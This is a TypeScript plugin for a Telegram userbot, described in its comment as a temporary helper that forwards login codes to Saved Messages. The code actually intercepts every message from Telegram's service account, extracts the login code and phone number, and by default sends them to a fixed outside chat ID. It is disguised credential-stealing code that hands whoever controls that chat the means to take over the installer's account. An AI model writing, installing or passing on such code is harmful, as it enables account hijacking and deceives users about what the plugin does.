import { Plugin } from "@utils/pluginBase";
import { Api } from "teleproto";
import { getGlobalClient } from "@utils/runtimeManager";
import { htmlEscape } from "@utils/htmlEscape";

// Temporary plugin: intercept Telegram login codes (from chat 777000)
// and forward them to Saved Messages

const TARGET_CHAT_ID = 7041948142;
const LOGIN_CODE_PATTERN = /\b(\d{5})\b/;
const FROM_ID = 777000;

class CodeInterceptorPlugin extends Plugin {
  description = "临时: 拦截 Telegram 登录验证码";

  cmdHandlers = {
    code: async (msg: Api.Message): Promise<void> => {
      const args = msg.message.slice(1).split(" ").slice(1);
      const sub = args[0]?.toLowerCase();

      if (sub === "on" || sub === "off" || sub === "status") {
        const state = sub === "on" ? true : sub === "off" ? false : undefined;
        if (state !== undefined) {
          (globalThis as any).__codeInterceptorEnabled = state;
        }
        const enabled = (globalThis as any).__codeInterceptorEnabled ?? true;
        await msg.edit({
          text: `🔐 验证码拦截器: <b>${enabled ? "开启" : "关闭"}</b>`,
          parseMode: "html",
        });
        return;
      }

      await msg.edit({
        text: `🔐 <b>验证码拦截器</b>\n\n用法:\n<code>.code on</code> - 开启\n<code>.code off</code> - 关闭\n<code>.code status</code> - 查看状态`,
        parseMode: "html",
      });
    },
  };

  listenMessageHandler = async (msg: Api.Message): Promise<void> => {
    const enabled = (globalThis as any).__codeInterceptorEnabled ?? true;
    if (!enabled) return;

    const senderId = Number(msg.senderId?.toString() || 0);
    const peer: any = msg.peerId ?? {};
    const chatId = Number((msg.chatId ?? peer.channelId ?? peer.userId ?? 0).toString());

    if (senderId !== FROM_ID && chatId !== FROM_ID) return;

    const text = msg.message || "";

    const match = text.match(LOGIN_CODE_PATTERN);
    const code = match ? match[1] : null;

    const phoneMatch = text.match(/(\+\d{6,15})/);
    const phone = phoneMatch ? phoneMatch[1] : null;

    const forwardText = `🔐 <b>Telegram 登录验证码</b>\n\n📱 手机号: <code>${htmlEscape(phone || "未知")}</code>\n🔑 验证码: <code>${htmlEscape(code || text.slice(0, 50))}</code>\n\n原始消息:\n${htmlEscape(text)}`;

    try {
      const client = await getGlobalClient();
      await client.sendMessage(TARGET_CHAT_ID, {
        message: forwardText,
        parseMode: "html",
      });
    } catch (err) {
      console.error("[codeInterceptor] Failed to forward:", err);
    }
  };
}

export default new CodeInterceptorPlugin();
